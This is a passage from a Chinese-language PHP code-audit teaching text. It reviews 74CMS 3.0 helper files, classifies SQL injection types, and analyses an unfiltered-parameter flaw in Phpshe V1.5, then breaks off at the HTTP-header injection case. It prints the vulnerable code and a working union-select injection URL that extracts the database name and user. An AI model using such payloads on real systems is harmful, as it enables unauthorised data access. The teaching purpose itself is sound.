  \u5B9A\u4E49\u8BE5\u7F51\u7AD9\u5168\u5C40$_CFG\u53D8\u91CF\uFF0C\u5305\u62EC\uFF1A\u56FE\u7247\u4E0A\u4F20\u76EE\u5F55\u3001\u7F29\u7565\u56FE\u76EE\u5F55\u3001\u7B80\u5386\u7167\u7247\u7B49\u4FE1\u606F\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image164.jpg)\r
\r
\u56FE2-15 common.inc.php\u6587\u4EF6\u4EE3\u7801\r
\r
l common.fun.php\u901A\u7528\u51FD\u6570\u6587\u4EF6\u5BA1\u8BA1\r
\r
\u8BE5\u6587\u4EF6\u5305\u542B\u4E86\u8BE5CMS\u4E2D\u7684\u901A\u7528\u51FD\u6570\uFF0C\u5176\u4E3B\u8981\u5305\u62EC\uFF1A\r
\r
  addslashes_deep\u51FD\u6570\uFF1A\u8BE5\u51FD\u6570\u9996\u5148\u5BF9\u4F20\u5165\u7684\u503C\u8FDB\u884C\u68C0\u6D4B\uFF0C\u5982\u679C\u4E3A\u7A7A\u5219\u9000\u51FA\u3002\u7136\u540E\u68C0\u67E5magic_quotes_gpc\uFF08\u9B54\u672F\u5F15\u53F7\u81EA\u52A8\u8FC7\u6EE4\u51FD\u6570\uFF09\u914D\u7F6E\u662F\u5426\u5F00\u542F\uFF0C\u5982\u679C\u6CA1\u6709\u5F00\u542F\u5219\u4F7F\u7528addslashes\u51FD\u6570\uFF08PHP\u4E2D\u8FC7\u6EE4\u51FD\u6570\uFF09\u5C06\u5355\u5F15\u53F7\u3001\u53CC\u5F15\u53F7\u3001NULL\u5B57\u7B26\u548C\u659C\u6760\u8FDB\u884C\u8F6C\u4E49\uFF0C\u5982\u56FE2-16\u6240\u793A\u3002\r
\r
  mystrip_tags\u51FD\u6570\uFF1A\uFF0C\u8BE5\u51FD\u6570\u5C06URL\u7F16\u7801\u8F6C\u6362\u4E3A\u5BF9\u5E94\u7B26\u53F7\uFF0C\u7136\u540E\u4F7F\u7528strip_tags\u51FD\u6570\u8FDB\u884C\u5B57\u7B26\u8FC7\u6EE4\uFF0C\u901A\u8FC7mystrip_tags\u51FD\u6570\u53EF\u9632\u5FA1XSS\u6F0F\u6D1E\u653B\u51FB\u3002\r
\r
  getip\u51FD\u6570\uFF1A\u5C06\u4ECEHTTP\u5934\u4E2D\u83B7\u53D6IP\u5730\u5740\u53C2\u6570\uFF0C\u5E76\u5BF9\u5176\u4F7F\u7528\u6B63\u5219\u5339\u914D\u3002\u8BE5\u6B63\u5219\u8868\u8FBE\u5F0F\u53EA\u9650\u5236\u4E86IP\u5730\u5740\u7684\u683C\u5F0F\uFF0C\u867D\u7136\u653B\u51FB\u8005\u65E0\u6CD5\u6784\u9020\u6076\u610F\u653B\u51FB\u8F7D\u8377\u8FDB\u884CSQL\u6CE8\u5165\u6F0F\u6D1E\u53CAXSS\u6F0F\u6D1E\u5229\u7528\uFF0C\u4F46\u53EF\u80FD\u5BFC\u81F4\u9ED1\u5BA2\u901A\u8FC7\u4F2A\u9020IP\u65B9\u5F0F\u8FDE\u63A5\u8BE5Web\u7F51\u7AD9\u3002\r
\r
  showmsg\u51FD\u6570\uFF1A\u8BE5\u51FD\u6570\u5C06\u4F20\u9012\u53C2\u6570$msg_detail\u3001$msg_type\u3001$links\u7B49\u663E\u793A\u5230\u524D\u53F0\u9875\u9762\uFF0C\u82E5\u5BF9\u8BE5\u4FE1\u606F\u8FC7\u6EE4\u4E0D\u4E25\uFF0C\u5C06\u5BFC\u81F4XSS\u6F0F\u6D1E\u3002\r
\r
  get_smarty_request\u51FD\u6570\uFF1A\u8BE5\u51FD\u6570\u5C06\u5BF9\u5B57\u7B26\u4E32\u8FDB\u884CURL\u89E3\u7801\uFF0C\u7136\u540E\u4F20\u53C2\u7684\u6570\u503C\u8FDB\u884C\u5904\u7406\uFF0C\u7531\u4E8E\u5BF9\u5176\u4F20\u53C2\u8FDB\u884CURL\u89E3\u7801\uFF0C\u5219\u53EF\u80FD\u5BFC\u81F4\u4E8C\u6B21\u6CE8\u5165\u7684\u60C5\u51B5\u3002\r
\r
  inserttable\u51FD\u6570\u3001updatetable\u51FD\u6570\u3001wheresql\u51FD\u6570\uFF1A\u4E0E\u6570\u636E\u5E93\u64CD\u4F5C\u76F8\u5173\u51FD\u6570\u3002\r
\r
  htmldecode\u51FD\u6570\u3001cut_str\u51FD\u6570\uFF1A\u4E0E\u5B57\u7B26\u4E32\u8FC7\u6EE4\u7F16\u7801\u76F8\u5173\u7684\u8FC7\u6EE4\u51FD\u6570\u3002\r
\r
  smtp_mail\u51FD\u6570\u3001asyn_sendmail\u51FD\u6570\uFF1A\u8BBE\u7F6E\u90AE\u7BB1\u53C2\u6570\u4E0E\u53D1\u9001\u90AE\u7BB1\u7684\u51FD\u6570\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image166.jpg)\r
\r
\u56FE2-16 common.fun.php\u6587\u4EF6addslashes_deep\u51FD\u6570\u4EE3\u7801\r
\r
l mysql.class.php\u901A\u7528\u51FD\u6570\u6587\u4EF6\u5BA1\u8BA1\r
\r
\u8BE5\u6587\u4EF6\u5B9A\u4E49\u4E86\u4E00\u4E2Amysql\u7C7B\uFF0C\u5176\u4E3B\u8981\u7528\u6765\u5B9E\u73B0\u6570\u636E\u5E93\u7684\u8FDE\u63A5\u3001\u64CD\u4F5C\u3001\u7BA1\u7406\u7B49\uFF0C\u4F8B\u5982\uFF1Aquery\u65B9\u6CD5\uFF08\u67E5\u8BE2\u65B9\u6CD5\uFF09\u3001getone\uFF08\u8FD4\u56DE\u4E00\u6761\u8BB0\u5F55\uFF09\u3001getall\uFF08\u8FD4\u56DE\u6240\u6709\u8BB0\u5F55\u7B49\u65B9\u6CD5\uFF09\u3002\u4EE3\u7801\u5BA1\u8BA1\u8FC7\u7A0B\u4E2D\uFF0C\u9700\u5173\u6CE8\u6570\u636E\u5E93\u7684\u8FDE\u63A5\u4F7F\u7528\u7684\u7F16\u7801\u3001\u6570\u636E\u5E93\u7684\u53C2\u6570\u8FC7\u6EE4\u3002\u8BE5CMS\u4F7F\u7528\u4E86GBK\u7F16\u7801\u8FDE\u63A5\u6570\u636E\u5E93\uFF0C\u5C06\u7ED5\u8FC7addslashes\u51FD\u6570\uFF0C\u53D1\u751F\u5BBD\u5B57\u8282SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\u56FE2-17\u4EE3\u7801\u4E3A\u81EA\u5B9A\u4E49\u6570\u636E\u5E93\u8FDE\u63A5\u51FD\u6570connect\uFF0C\u8BE5\u51FD\u6570\u9996\u5148\u5224\u65AD\u6570\u636E\u5E93\u662F\u5426\u80FD\u8FDB\u884C\u8FDE\u63A5\uFF0C\u8FDE\u63A5\u6210\u529F\u5219\u5224\u65AD\u6570\u636E\u5E93\u7248\u672C\u662F\u5426\u5927\u4E8E4.1\uFF0C\u5982\u679C\u5927\u4E8E4.1\u5219\u8BBE\u7F6E\u6570\u636E\u5E93\u67E5\u8BE2\u4E3AGBK\u7F16\u7801\u3002\u6240\u4EE5\uFF0C\u8BE5CMS\u5B58\u5728\u5BBD\u5B57\u8282SQL\u6CE8\u5165\u6F0F\u6D1E\uFF08\u8BE5\u6F0F\u6D1E\u653B\u51FB\u65B9\u5F0F\u5C06\u5728SQL\u6CE8\u5165\u5BA1\u8BA1\u5355\u5143\u4E2D\u8FDB\u884C\u4ECB\u7ECD\uFF09\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image168.jpg)\r
\r
\u56FE2-17 mysql.class.php\u6587\u4EF6\u4EE3\u7801\r
\r
\u81F3\u6B64\uFF0C\u672C\u8282\u7ED9\u51FA\u4E8674CMS3.0\u7684\u90E8\u5206\u5165\u53E3\u6587\u4EF6\u7684\u4EE3\u7801\u5BA1\u8BA1\u6D41\u7A0B\u3002\u800C\u901A\u8BFB\u5168\u6587\u6CD5\u8FD8\u9700\u5BF9\u6240\u6709\u6838\u5FC3\u4EE3\u7801\u6587\u4EF6\u3001\u914D\u7F6E\u6587\u4EF6\u7B49\u8FDB\u884C\u8D70\u8BFB\u3002\r
\r
## 2.5 \u5355\u5143\u5C0F\u7ED3\r
\r
\u672C\u5355\u5143\u5BF9\u4EE3\u7801\u5BA1\u8BA1\u524D\u5BFC\u8FDB\u884C\u4ECB\u7ECD\uFF0C\u4F7F\u8BFB\u8005\u80FD\u591F\u719F\u6089\u4EE3\u7801\u5BA1\u8BA1\u76F8\u5173\u7684\u914D\u7F6E\u4E0E\u51FD\u6570\u3002\u5BF9\u4E8E\u4EE3\u7801\u5BA1\u8BA1\u800C\u8A00\uFF0C\u9700\u8981\u5BF9PHP\u7684\u4EE3\u7801\u53CA\u914D\u7F6E\u6709\u4E00\u5B9A\u7684\u57FA\u7840\uFF0C\u624D\u80FD\u5BF9\u5404\u79CDCMS\u8FDB\u884C\u8BE6\u7EC6\u7684\u5BA1\u8BA1\u3002\u672C\u5355\u5143\u9996\u5148\u5217\u51FA\u5E38\u89C1\u7684PHP\u914D\u7F6E\uFF0C\u7136\u540E\u5BF9PHP\u4EE3\u7801\u4E2D\u67E5\u5E38\u89C1\u6F0F\u6D1E\u7684\u654F\u611F\u51FD\u6570\u8FDB\u884C\u5217\u4E3E\u3002\u6700\u540E\uFF0C\u7ED9\u51FA\u4E09\u79CD\u4EE3\u7801\u5BA1\u8BA1\u601D\u8DEF\uFF1A\u654F\u611F\u51FD\u6570\u53C2\u6570\u56DE\u6EAF\u3001\u5B9A\u5411\u529F\u80FD\u5206\u6790\u3001\u901A\u8BFB\u5168\u6587\u6CD5\uFF0C\u5E76\u5BF9\u8FD9\u4E09\u79CD\u65B9\u6CD5\u7ED9\u51FA\u5BF9\u5E94\u5B9E\u9A8C\u7EC3\u4E60\u3002\r
\r
\r
\r
 \r
\r
# \u5355\u51433 SQL\u6CE8\u5165\u6F0F\u6D1E\u5BA1\u8BA1\r
\r
**\u5355\u5143\u6982\u8FF0\uFF1A**\r
\r
\u672C\u5355\u5143\u4ECB\u7ECD\u4E86\u4EE3\u7801\u5BA1\u8BA1\u4E2D\u6700\u5E38\u89C1\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\u5BA1\u8BA1\u3002\r
\r
\u7B2C\u4E00\u90E8\u5206\u4E3B\u8981\u4ECB\u7ECDSQL\u6CE8\u5165\u6F0F\u6D1E\u7684\u57FA\u7840\u77E5\u8BC6\uFF0C\u5305\u62EC\uFF1ASQL\u6CE8\u5165\u6F0F\u6D1E\u7B80\u4ECB\u3001SQL\u6CE8\u5165\u6F0F\u6D1E\u5206\u7C7B\u3001\u6316\u6398\u7ECF\u9A8C\u3002\r
\r
\u7B2C\u4E8C\u90E8\u5206\u4E3B\u8981\u4ECB\u7ECDCMS\u6848\u4F8B\u4E2D\u4E09\u79CDSQL\u6CE8\u5165\u6F0F\u6D1E\u4EE3\u7801\u5BA1\u8BA1\uFF0C\u5305\u62EC\uFF1A\u65E0\u8FC7\u6EE4\u53C2\u6570SQL\u6CE8\u5165\u3001\u65E0\u8FC7\u6EE4HTTP\u5934SQL\u6CE8\u5165\u3001\u7ED5\u8FC7\u5B57\u7B26\u4E32\u66FF\u6362SQL\u6CE8\u5165\u3002\r
\r
\u7B2C\u4E09\u90E8\u5206\u4ECB\u7ECD\u7ED5\u8FC7addslashes\u7684\u6CE8\u5165\u65B9\u6CD5\uFF1A\u5BBD\u5B57\u8282\u6CE8\u5165\u3001\u89E3\u7801\u6CE8\u5165\u3001\u5B57\u7B26\u4E32\u66FF\u6362\u7B49\u3002\r
\r
\u7B2C\u56DB\u90E8\u5206\u4ECB\u7ECD\u4E86SQL\u6CE8\u5165\u7684\u9632\u5FA1\u51FD\u6570\uFF0C\u5305\u62EC\uFF1AGPC\u3001PHP\u901A\u7528\u9632\u5FA1\u51FD\u6570\u3001PDO\u9884\u7F16\u8BD1\u9632\u5FA1\u673A\u5236\u7B49\u3002\r
\r
**\u5355\u5143\u6784\u56FE\uFF1A**\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image170.jpg)\r
\r
**\u5355\u5143\u76EE\u6807\uFF1A**\r
\r
\\1. \u719F\u6089SQL\u6CE8\u5165\u6F0F\u6D1E\u7684\u7B80\u4ECB\u53CA\u5206\u7C7B\uFF1B\r
\r
\\2. \u4E86\u89E3SQL\u6CE8\u5165\u6F0F\u6D1E\u7684\u6316\u6398\u6280\u5DE7\uFF1B\r
\r
\\3. \u638C\u63E1\u5404\u7C7BSQL\u6CE8\u5165\u6F0F\u6D1E\u7684\u4EE3\u7801\u5BA1\u8BA1\u65B9\u6CD5\uFF1B\r
\r
\\4. SQL\u6CE8\u5165\u6F0F\u6D1E\u7684\u57FA\u672C\u9632\u5FA1\u65B9\u6CD5\u3002\r
\r
## 3.1 SQL\u6CE8\u5165\u6F0F\u6D1E\u6316\u6398\r
\r
### 3.1.1 SQL\u6CE8\u5165\u6F0F\u6D1E\u7B80\u4ECB\r
\r
SQL\u6CE8\u5165\u653B\u51FB\uFF08SQL Injection\uFF09\u7B80\u79F0SQL\u6CE8\u5165\uFF0C\u662F\u4EE3\u7801\u5BA1\u4E2D\u6BD4\u8F83\u91CD\u89C6\u7684\u6F0F\u6D1E\u4E4B\u4E00\uFF0CSQL\u6CE8\u5165\u4EA7\u751F\u7684\u539F\u56E0\u662F\u7A0B\u5E8F\u672A\u6709\u6548\u8FC7\u6EE4\u8F93\u5165\u5185\u5BB9\uFF0C\u5BFC\u81F4\u653B\u51FB\u8005\u5411\u670D\u52A1\u5668\u63D0\u4EA4\u6076\u610F\u7684SQL\u8BED\u53E5\uFF0C\u5E76\u62FC\u63A5\u5230\u7A0B\u5E8F\u539F\u6709\u7684SQL\u8BED\u53E5\u4E2D\uFF0C\u4F7F\u539F\u59CBSQL\u8BED\u53E5\u903B\u8F91\u88AB\u6539\u53D8\uFF0C\u6700\u7EC8\u6267\u884C\u4E86\u653B\u51FB\u8005\u7CBE\u5FC3\u6784\u9020\u7684\u6076\u610F\u4EE3\u7801\u3002\r
\r
### 3.1.2 SQL\u6CE8\u5165\u6F0F\u6D1E\u5206\u7C7B\u6982\u8FF0\r
\r
\u672C\u5C0F\u8282\u5C06\u4ECB\u7ECDSQL\u6CE8\u5165\u6F0F\u6D1E\u7C7B\u578B\u3002\r
\r
  \uFF081\uFF09\u6309\u6570\u636E\u7C7B\u578B\u5206\u7C7B\r
\r
SQL\u6CE8\u5165\u6309\u7167\u6570\u636E\u7C7B\u578B\u5206\u4E3A\u6570\u5B57\u578B\u6CE8\u5165\u548C\u5B57\u7B26\u578B\u6CE8\u5165\u3002\u6CE8\u5165\u70B9\u6570\u636E\u7C7B\u578B\u4E3A\u6570\u5B57\u65F6\u4E3A\u6570\u5B57\u578B\u6CE8\u5165\uFF0C\u6CE8\u5165\u70B9\u6570\u636E\u4E3A\u5B57\u7B26\u578B\u65F6\u4E3A\u5B57\u7B26\u578B\u6CE8\u5165\u3002\r
\r
\uFF082\uFF09\u6309\u8FD4\u56DE\u4FE1\u606F\u5206\u7C7B\r
\r
SQL\u6CE8\u5165\u6309\u7167\u670D\u52A1\u5668\u8FD4\u56DE\u4FE1\u606F\u662F\u5426\u663E\u793A\u5206\u4E3A\u62A5\u9519\u6CE8\u5165\u548C\u76F2\u6CE8\u3002\u5728\u6CE8\u5165\u7684\u8FC7\u7A0B\u4E2D\uFF0C\u7A0B\u5E8F\u5C06\u83B7\u53D6\u7684\u4FE1\u606F\u76F4\u63A5\u663E\u793A\u4E8E\u9875\u9762\u4E3A\u62A5\u9519\u6CE8\u5165\uFF1B\u7A0B\u5E8F\u4E0D\u663E\u793A\u4EFB\u4F55SQL\u62A5\u9519\u4FE1\u606F\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6784\u9020SQL\u8BED\u53E5\uFF0C\u6839\u636E\u9875\u9762\u662F\u5426\u6B63\u5E38\u8FD4\u56DE\u6216\u8FD4\u56DE\u65F6\u95F4\u5224\u65AD\u6CE8\u5165\uFF0C\u8FD9\u6837\u7684\u6CE8\u5165\u79F0\u4E3A\u76F2\u6CE8\u3002\r
\r
\uFF083\uFF09\u6309\u6CE8\u5165\u70B9\u5206\u7C7B\r
\r
SQL\u6CE8\u5165\u6309\u7167HTTP\u8BF7\u6C42\u4E2D\u6570\u636E\u63D0\u4EA4\u65B9\u5F0F\u4E0D\u540C\u5212\u5206\u4E3AGET\u578B\u6CE8\u5165\u3001POST\u578B\u6CE8\u5165\u3001Cookie\u6CE8\u5165\u3001HTTP\u5934\u6CE8\u5165\u7B49\u3002\u7531\u4E8EHTTP\u8BF7\u6C42\u5934\u4E2D\u53C2\u6570\u6CE8\u5165\u4F4D\u7F6E\u4E0D\u540C\uFF0C\u5212\u5206\u4E3A\uFF1ACookie\u6CE8\u5165\u3001Referer\u6CE8\u5165\u3001X-forward-for\u6CE8\u5165\u7B49\u3002\r
\r
\uFF084\uFF09\u7F16\u7801\u95EE\u9898\u5BFC\u81F4\u7684SQL\u6CE8\u5165\r
\r
\u7A0B\u5E8F\u4F1A\u8FDB\u884C\u4E00\u4E9B\u7F16\u7801\u5904\u7406\uFF0C\u7F16\u7801\u95EE\u9898\u662F\u901A\u8FC7\u8F93\u5165\u4E0D\u517C\u5BB9\u7684\u7279\u6B8A\u5B57\u7B26\uFF0C\u5BFC\u81F4\u8F93\u51FA\u5B57\u7B26\u88AB\u9519\u8BEF\u89E3\u7801\u5E76\u8FDB\u884C\u5229\u7528\u3002\u5728SQL\u6CE8\u5165\u6F0F\u6D1E\u4E2D\uFF0C\u7F16\u7801\u95EE\u9898\u5BFC\u81F4\u7684\u6F0F\u6D1E\u5206\u4E3A\uFF1A\u5BBD\u5B57\u8282\u6CE8\u5165\u3001\u4E8C\u6B21UrlCode\u7F16\u7801\u6CE8\u5165\u3002\u56FE3-1\u4E3ASQL\u6CE8\u5165\u6F0F\u6D1E\u5206\u7C7B\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image172.jpg)\r
\r
\u56FE3-1 SQL\u6CE8\u5165\u5206\u7C7B\u56FE\r
\r
### 3.1.3 SQL\u6CE8\u5165\u6F0F\u6D1E\u6316\u6398\u7ECF\u9A8C\r
\r
\u4EE3\u7801\u5BA1\u8BA1\u4E2DSQL\u6CE8\u5165\u7684\u76F2\u70B9\u5305\u62EC\uFF1A\r
\r
1\u3001GET\u65B9\u5F0F\u4F20\u9012\u7684\u6570\u5B57\u578B\u53C2\u6570\u4F1A\u65E0\u89C6magic_quotes_gpc\u8FC7\u6EE4\uFF08\u7B80\u79F0\u201CGPC\u8FC7\u6EE4\u201D\uFF09\u5E76\u7ED5\u8FC7addslashes\u51FD\u6570\u3002\u6570\u5B57\u578BSQL\u6CE8\u5165\u6F0F\u6D1E\u5982\u4E0B\uFF1A\r
\r
l \u6570\u5B57\u578B\u53C2\u6570\u4E0D\u52A0\u5355\u5F15\u53F7\u4FDD\u62A4\uFF1B\r
\r
l \u6570\u5B57\u578B\u53C2\u6570\u672A\u4F7F\u7528intval\u51FD\u6570\u4FDD\u62A4\uFF1B\r
\r
2\u3001 \u6CE8\u5165\u70B9\u662F\u952E\u503C\u5BF9\uFF0C\u51FD\u6570\u53EA\u5BF9\u503C\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u672A\u5BF9\u952E\u8FDB\u884C\u8FC7\u6EE4\u3002\r
\r
\u8FC7\u6EE4\u51FD\u6570\u5148\u5224\u65ADGPC\u662F\u5426\u5F00\u542F\uFF0C\u5982\u679C\u672A\u5F00\u542F\u5BF9\u503C\u8FDB\u884Caddslashes\u8FC7\u6EE4\uFF0C\u6076\u610F\u4EE3\u7801\u901A\u8FC7\u952E\u5E26\u5165\u5230SQL\u8BED\u53E5\u4E2D\u3002\r
\r
3\u3001\u5168\u5C40\u8FC7\u6EE4\u65F6\uFF0C\u53EA\u8FC7\u6EE4GET\u3001POST\u3001COOKIE\uFF0C\u672A\u8FC7\u6EE4SERVER\u53D8\u91CF\u3002\u5E38\u89C1SERVER\u53D8\u91CF\uFF08\u5371\u9669\u53D8\u91CF\uFF09\u5305\u62EC\uFF1AQUERY_STRING\uFF0CX_FORWARDED_FOR\uFF0CCLIENT_IP\uFF0CHTTP_HOST\uFF0CACCEPT_LANGUAGE\u3002\u6F0F\u6D1E\u5982\u4E0B\uFF1A\r
\r
l \u83B7\u53D6\u7528\u6237IP\u5E76\u5C06\u53D8\u91CFX_FORWARDED_FOR\u5B58\u5165\u6570\u636E\u5E93\u3002\r
\r
l \u68C0\u6D4BIP\u7684\u6B63\u5219\u8868\u8FBE\u5F0F\u53EF\u88AB\u7ED5\u8FC7\u3002\r
\r
4\u3001FILES\u6CE8\u5165\uFF0C\u5168\u5C40\u53EA\u8F6C\u4E49GET\u3001POST\u4F20\u9012\u7684\u53C2\u6570\uFF0C\u800C\u9057\u6F0FFILES\u53C2\u6570\u8FC7\u6EE4\u3002\r
\r
l \u901A\u8FC7\u4E0A\u4F20\u7684\u540D\u5B57\u901A\u8FC7Insert\u8BED\u53E5\u5E26\u5165\u6570\u636E\u5E93\u9020\u6210FILES\u6CE8\u5165\uFF1B\r
\r
l \u5C06\u6587\u4EF6\u540D\u7684\u8F6C\u4E49\u5B58\u5165\u6570\u636E\u5E93\uFF0C\u5374\u6CA1\u6709\u5BF9\u5176\u540E\u7F00\u8F6C\u4E49\u5BFC\u81F4FILES\u6CE8\u5165\u3002\r
\r
\u9664\u4E0A\u8FF0\u4ECB\u7ECD\u7684\u6CE8\u5165\u7ECF\u9A8C\u5916\uFF0C\u4EE3\u7801\u5BA1\u8BA1\u8FD8\u53EF\u901A\u8FC7\u67E5\u627E\u5173\u952E\u5B57\u5FEB\u901F\u6316\u6398\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u4F8B\u5982\uFF1Aselect from\u3001mysql_connect\u3001mysql_query\u3001mysql_fetch_row\u7B49\u3002\r
\r
## 3.2 SQL\u6CE8\u5165\u5206\u7C7B\r
\r
\u672C\u8282\u4ECB\u7ECDCMS\u6848\u4F8B\u4E2D\u7684\u4E09\u79CDSQL\u6CE8\u5165\uFF1A\u65E0\u8FC7\u6EE4\u53C2\u6570\u6CE8\u5165\u3001\u65E0\u8FC7\u6EE4HTTP\u5934\u6CE8\u5165\u3001\u5B57\u7B26\u4E32\u66FF\u6362\u7ED5\u8FC7\u6CE8\u5165\u3002\r
\r
### 3.2.1  \u65E0\u8FC7\u6EE4\u53C2\u6570\u6CE8\u5165\r
\r
\u672C\u5C0F\u8282\u4E3B\u8981\u4ECB\u7ECDSQL\u6CE8\u5165\u4E2D\u7684\u65E0\u8FC7\u6EE4\u53C2\u6570\u6CE8\u5165\u8FDB\u884C\u4ECB\u7ECD\uFF0C\u8BE5\u7C7B\u578B\u6CE8\u5165\u65B9\u5F0F\u7684\u5173\u6CE8\u70B9\u5728\u4E8EHTTP\u8BF7\u6C42\u53C2\u6570\u4F20\u9012\u8FC7\u7A0B\u4E2D\u6570\u636E\u7684\u7C7B\u578B\u3002\u6B64\u7C7B\u6F0F\u6D1E\u7684\u5229\u7528\u65B9\u5F0F\u4E5F\u5927\u591A\u4EE5union select\u65B9\u5F0F\u83B7\u53D6\u6570\u636E\u5E93\u6570\u636E\u6216\u5199\u5165\u6728\u9A6C\u6587\u4EF6\u4E3A\u4E3B\uFF08\u90E8\u5206\u4E66\u7C4D\u5C06\u5176\u79F0\u4E4B\u4E3Aunion\u6CE8\u5165\uFF09\uFF0C\u4E3A\u80FD\u591F\u8BA9\u8BFB\u8005\u7406\u89E3\u6F0F\u6D1E\u6CE8\u5165\u4EE3\u7801\u4ECE\u800C\u6253\u597D\u4EE3\u7801\u5BA1\u8BA1\u57FA\u7840\uFF0C\u672C\u8282\u5C06\u7ED9\u51FA\u8BE5\u7C7B\u578B\u6F0F\u6D1E\u7ECF\u5178\u4EE3\u7801\u6848\u4F8B\u3002\r
\r
\uFF081\uFF09  \u6848\u4F8B\u5206\u6790\r
\r
Phpshe V1.5\u7248\u672C\u4E2D\u5B58\u5728\u65E0\u8FC7\u6EE4\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u5728\\module\\admin\\moneylog.php\u6587\u4EF6\u7684\u7B2C10-11\u884C\u4E2D\uFF0C\u53D8\u91CF$g_user_name\u4E0E$g_type\u76F4\u63A5\u62FC\u63A5\u5230SQL\u8BED\u53E5\u4E2D\uFF0C\u5176\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
$menumark = 'moneylog';\r
\r
switch ($act) {\r
\r
  default:\r
\r
\u200B    **$_g_user_name && $sql_where .= " and \`user_name\` like '%{$_g_user_name}%'";**\r
\r
\u200B    **$_g_type && $sql_where .= " and \`moneylog_type\` = '{$_g_type}'";**\r
\r
\u200B    **$sql_where .= ' order by moneylog_id desc';**\r
\r
\u200B    $info_list = $db->pe_selectall('moneylog', $sql_where, '*', array(50, $_g_page));\r
\r
\u200B    $tongji['all'] = $db->pe_num('moneylog');\r
\r
\u200B    $seo = pe_seo($menutitle='\u8D44\u91D1\u660E\u7EC6');\r
\r
\u200B    include(pe_tpl('moneylog_list.html'));\r
\r
  break;\r
\r
}\r
\r
\r
\r
\u5BA1\u8BA1\u53C2\u6570$_g_user_name\u4E0E$_g_type\u662F\u5426\u8FDB\u884C\u5B89\u5168\u8FC7\u6EE4\u3002\u5BF9\u6B64\u53C2\u6570\u8FDB\u884C\u654F\u611F\u51FD\u6570\u56DE\u6EAF\uFF0C\u53D1\u73B0\u5728phpshe1.5\\common.php\u4E2D\u8FDB\u884C\u4E86GET\u548CPOST\u7684\u53D8\u91CF\u521B\u5EFA\uFF0C\u5176\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
if (get_magic_quotes_gpc()) {\r
\r
  !empty($_GET) && **extract**(**pe_trim(pe_stripslashes($_GET))**, EXTR_PREFIX_ALL, '_g');\r
\r
  !empty($_POST) && **extract**(**pe_trim(pe_stripslashes($_POST))**, EXTR_PREFIX_ALL, '_p');}\r
\r
else {\r
\r
  !empty($_GET) && extract(**pe_trim($_GET)**,EXTR_PREFIX_ALL,'_g');\r
\r
  !empty($_POST) && extract(**pe_trim($_POST)**,EXTR_PREFIX_ALL,'_p');}\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u6D41\u7A0B\u4E3A\uFF1A\r
\r
l \u5224\u65AD\u7F51\u7AD9\u662F\u5426\u5F00\u542F\u4E86GPC\uFF0C\u82E5\u5F00\u542F\u5219\u8C03\u7528pe_stripslashes\u51FD\u6570\u5BF9\u53C2\u6570\u5220\u9664\u53CD\u659C\u6760\u3002\r
\r
l \u82E5\u672A\u5F00\u542F\u7EC4\u8C03\u7528pe_trim\u51FD\u6570\u5BF9\u53C2\u6570\u9996\u5C3E\u53BB\u7A7A\u683C\u3002\r
\r
l \u8C03\u7528extract\u51FD\u6570\u521B\u5EFA\u53D8\u91CF\uFF0C\u672A\u5BF9\u53D8\u91CF\u8FDB\u884C\u5B89\u5168\u5904\u7406\uFF0C\u56E0\u6B64\u5B58\u5728SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
\uFF082\uFF09\u6F0F\u6D1E\u5229\u7528\r
\r
http://127.0.0.1/code/phpshe1.5/admin.php?mod=moneylog&user_name=t)' union select 1,2,3,4,5,6,(database()),8,(user()) %23&type=111\uFF0C\u76F4\u63A5\u901A\u8FC7union\u6CE8\u5165\u83B7\u53D6\u90FD\u6570\u636E\u5E93\u540D\u79F0\u4E0E\u7528\u6237\u540D\u79F0\uFF0C\u6267\u884C\u7ED3\u679C\u5982\u56FE3-2\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image174.gif)\r
\r
\u56FE3-2 Union SQL\u6CE8\u5165\u6548\u679C\u56FE\r
\r
### 3.2.2  \u65E0\u8FC7\u6EE4HTTP\u5934\u6CE8\u5165\r
\r
\u5BF9\u4E8E\u4EE3\u7801\u5BA1\u8BA1\u800C\u8A00\uFF0C\u65E9\u671FCMS\u7A0B\u5E8F\u5728\u5F00\u53D1\u65F6\uFF0C\u6709\u65F6\u5019\u4F1A\u4F7F\u7528\u5168\u5C40\u8FC7\u6EE4\u53EA\u8FC7\u6EE4\u6389GET\u3001POST\u548CCOOKIE\uFF0C\u4F46\u672A\u8FC7\u6EE4SERVER\u7B49\u53D8\u91CF\uFF0C\u8FD9\u5C06\u5BFC\u81F4SERVER\u6CE8\u5165\u7684\u53D1\u751F\u3002\u5E38\u89C1\u7684SERVER\u53D8\u91CF\uFF08\u5371\u9669\u53D8\u91CF\uFF09\u5305\u62EC\uFF1AQUERY_STRING\uFF0CX_FORWARDED_FOR\uFF0CCLIENT_IP\uFF0CHTTP_HOST\uFF0CACCEPT_LANGUAGE\u3002\r
\r
\uFF081\uFF09\u6848\u4F8B\u5206\u6790\r
\r
